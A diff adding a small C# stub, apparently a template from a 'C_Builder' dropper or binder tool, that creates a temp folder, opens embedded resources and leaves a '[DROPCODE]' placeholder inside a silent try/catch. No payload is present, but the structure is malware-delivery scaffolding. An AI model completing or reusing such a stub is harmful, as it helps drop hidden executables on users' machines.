@@ -1,0 +1,27 @@
+﻿using System;
+using System.IO;
+using System.Resources;
+using System.Reflection;
+using System.Diagnostics;
+
+namespace C_Builder
+{
+    static class Readandlaunch
+    {
+        static void Main()
+        {
+            try
+            {
+                string path = Path.GetTempPath() + "//rec";
+                if (!Directory.Exists(path))
+                {
+                    Directory.CreateDirectory(path);
+                }
+                ResourceManager m = new ResourceManager("files", Assembly.GetExecutingAssembly());
+                [DROPCODE]
+            }
+            catch { }
+        }
+    }
+}
+
